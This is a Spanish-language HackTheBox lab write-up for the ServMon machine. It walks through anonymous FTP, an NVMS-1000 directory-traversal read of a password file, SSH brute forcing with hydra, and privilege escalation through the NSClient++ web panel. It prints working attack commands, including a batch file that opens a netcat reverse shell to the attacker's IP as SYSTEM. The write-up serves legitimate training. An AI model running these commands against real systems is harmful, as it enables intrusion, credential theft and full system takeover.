# ServMon - HackTheBox

**Fecha de resolución:** 25-26 de septiembre de 2026

Máquina Windows, IP inicial 10.129.227.77 (cambió a 10.129.62.66 durante el enganche por un reset del laboratorio). El nombre viene de los servicios de monitorización (NSClient++, NRPE) que corren en ella.

## Reconocimiento

Escaneo completo de puertos:

```
nmap 10.129.227.77 -n -sS -p- --min-rate 5000 -vvv -oG allPorts
```

Puertos abiertos: 21 (ftp, Microsoft ftpd), 22 (OpenSSH for_Windows_8.0), 80 (http), 135/139/445 (RPC/SMB), 5666 (NRPE), 6063, 6699, 8443 (https-alt) y varios puertos RPC altos (49664-49670). Escaneo de versión sobre esos puertos:

```
nmap 10.129.227.77 -p21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 -sS -sCV -oN targets
```

El puerto 80 redirige a `Pages/login.htm` sin devolver título. El puerto 8443 responde con un `NSClient++`, el frontal web de administración del agente de monitorización.

## FTP anónimo

El ftp permitía login anónimo:

```
ftp 10.129.227.77
```

Dentro había un directorio `Users` con subcarpetas para `Nadine` y `Nathan`, cada una con archivos personales. Descargué lo que había:

```
cd Users
cd Nadine
get Confidential.txt
cd ../Nathan
get *
get Notes\ to\ do.txt
```

`Confidential.txt` es una nota de Nadine para Nathan diciéndole que le dejó su `Passwords.txt` en el escritorio y que lo borre una vez lo haya revisado. `Notes to do.txt` es una lista de tareas pendientes de Nathan, entre ellas "Upload the passwords" y "Remove public access to NVMS" (ambas sin marcar como completadas, a diferencia de las dos primeras).

## Enumeración web

Fingerprint con whatweb y varias pasadas de gobuster contra el puerto 80, tanto en la raíz como en `/Pages`, usando el diccionario de DirBuster medium. La primera pasada devolvió aviso de wildcard (toda ruta inexistente responde 200 con 118 bytes), así que hubo que repetir añadiendo `--exclude-length 118`. Ni sobre `/` ni sobre `/Pages` salió nada nuevo aparte de lo ya conocido por la redirección a `login.htm`; también probé gobuster contra el 8443 (NSClient++) sin resultado. La app en el puerto 80 es un NVMS-1000 (sistema de gestión de cámaras TVT), identificable por el propio login.

Busqué exploits conocidos para NVMS-1000:

```
searchsploit nvms 1000
```

Salieron dos: `hardware/webapps/47774.txt` (info disclosure) y `hardware/webapps/48311.py` (directory traversal, CVE-2019-20085). Copié el segundo:

```
searchsploit -m hardware/webapps/48311.py
```

## Adaptando el exploit de traversal

El script está en Python 2 (usa `print` sin paréntesis). Ejecutarlo directo con `python3` falló:

```
python3 48311.py http://10.129.227.77 windows/win.ini win.ini
```

```
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
```

Probé `2to3` para convertirlo automáticamente pero no estaba instalado:

```
2to3
Command '2to3' not found, but can be installed with: sudo apt install python3-fissix
```

Tras instalarlo (`sudo apt install python3-fissix`) y correr `2to3 -w 48311.py`, la sintaxis quedó en Python 3 pero la siguiente ejecución rompió por otro motivo:

```
urllib3.exceptions.LocationParseError: Failed to parse: '10.129.227.77..', label empty or too long
```

Era un problema de cómo se concatenaba la URL base con la cadena de traversal cuando la URL no llevaba `/` final. Corrigiendo eso, el script ya no lanzaba excepción, pero devolvía "Host not vulnerable to Directory Traversal!" para `windows/win.ini`. El motivo real es que `requests.get()` normaliza internamente los `../` de la URL antes de enviarla, así que el servidor recibía una ruta ya colapsada y sin traversal real. Peor aún: en otras pruebas (contra `Users`, `Users/Nathan`, `Users/Nathan/Desktop`, incluida una tanda con un typo `Usersadads`) el script sí imprimía "Directory Traversal Succeeded", porque solo comprueba `status_code == 200`, y el NVMS responde 200 con un XML de error genérico incluso para rutas inválidas:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<response><status>fail</status><errorCode>536870934</errorCode></response>
```

O sea, el check de éxito del exploit es un falso positivo y el contenido guardado en esos casos era ese XML de fallo, no el archivo real.

Para forzar el envío de la ruta cruda sin que `requests` la normalizara, edité el script a mano con nano, sustituyendo el `requests.get(url)` por:

```python
session = requests.Session()
req = requests.Request('GET', url)
prep = session.prepare_request(req)
prep.url = url
content = session.send(prep)
```

Al guardar el archivo con nano quedó con una mezcla de tabuladores y espacios que rompió la indentación (`TabError: inconsistent use of tabs and spaces`). Probé arreglarlo con `expand -t 4 48311.py > exploit_arreglado.py`, pero seguía fallando (`IndentationError: unexpected indent`). Abandoné el script en ese punto y pasé a `curl` directamente.

## Extracción de Passwords.txt por traversal

```
curl "http://10.129.227.77/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" -o Passwords.txt
```

Esa primera llamada sin más opciones descargó igualmente el XML de fallo (curl también colapsa los `../` de la ruta por defecto). Añadiendo `--path-as-is` para que respete la ruta literal:

```
curl "http://10.129.227.77/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" -o Passwords.txt --path-as-is
```

Esta vez sí bajó el contenido real, una lista de 7 contraseñas candidatas.

## Acceso SSH

Con esa lista probé fuerza bruta por SSH. Antes había probado también con rockyou.txt contra el usuario Nathan sin éxito:

```
hydra -l Nathan -P /usr/share/wordlists/rockyou.txt 10.129.227.77 ssh
1 of 1 target completed, 0 valid password found
```

Con la lista filtrada del traversal, en cambio, hubo acierto, pero no para Nathan (a cuyo escritorio pertenecía el archivo) sino para Nadine:

```
hydra -l Nadine -P Passwords.txt 10.129.227.77 ssh
[22][ssh] host: 10.129.227.77   login: Nadine   password: L1k3B1gBut7s@W0rk
```

Encaja con la nota de `Confidential.txt`: el `Passwords.txt` que Nadine dejó en el escritorio de Nathan era en realidad la lista de contraseñas de la propia Nadine.

```
ssh Nadine@10.129.227.77
```

Sesión en PowerShell como `nadine`. Flag de usuario en `Desktop\user.txt`.

## Escalada a SYSTEM vía NSClient++

Recorriendo `C:\Program Files` aparecen tanto `NVMS-1000` como `NSClient++`. Dentro de la carpeta de NSClient++ está `nsclient.ini`, con la contraseña del panel web en claro:

```
cat .\nsclient.ini
password = ew2x6SsGTxjRwXOT
```

Lo confirmé además con el propio binario:

```
.\nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

Antes de tocar nada del panel busqué si había algo conocido para NSClient++:

```
searchsploit nsclient
```

De ahí salió la vía de escalada que usé: el propio panel web de NSClient++ permite definir/ejecutar scripts externos, y como el servicio corre como SYSTEM, cualquier comando lanzado desde ahí se ejecuta con esos privilegios. No es un paso que me inventara sobre la marcha, es la escalada documentada para este servicio.

Al intentar entrar directamente a `https://10.129.227.77:8443/` la página se quedaba colgada sin cargar, probablemente algún filtrado del firewall bloqueando el acceso directo al puerto desde fuera. Para llegar al panel web del NSClient++ monté un túnel por el SSH ya autenticado como Nadine, saliendo así desde la propia máquina hacia `127.0.0.1:8443`:

```
ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77
```

El IP del objetivo cambió a mitad del enganche (reset del laboratorio de HTB), así que repetí el túnel contra la IP nueva:

```
ssh -L 8443:127.0.0.1:8443 nadine@10.129.62.66
```

Con la contraseña del `nsclient.ini` autenticado en el panel, preparé una reverse shell para que la ejecutara el servicio de NSClient++ (que corre como SYSTEM). Descargué una copia de netcat para Windows y escribí el batch de disparo:

```
wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe
nano evil.bat
```

```bat
@echo off
c:\temp\nc.exe 10.10.14.224 4444 -e cmd.exe
```

La primera versión de `evil.bat` tenía un dato mal puesto y hubo que borrarla y reescribirla:

```
rm evil.bat
nano evil.bat
```

Comprobé mi propia IP de VPN para el callback:

```
hostname -I
```

Subí ambos archivos a la máquina por scp usando las credenciales de Nadine:

```
scp nc.exe evil.bat Nadine@10.129.62.66:C:/temp/
```

Puse el listener en escucha:

```
nc -lvnp 4444
```

Y disparé el batch como tarea programada/script externo desde el propio panel de NSClient++, ya autenticado con la contraseña extraída del `nsclient.ini`. El listener recibió la conexión de vuelta con privilegios de SYSTEM, con la que leí la flag de root.

---

- GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
- TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
- HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
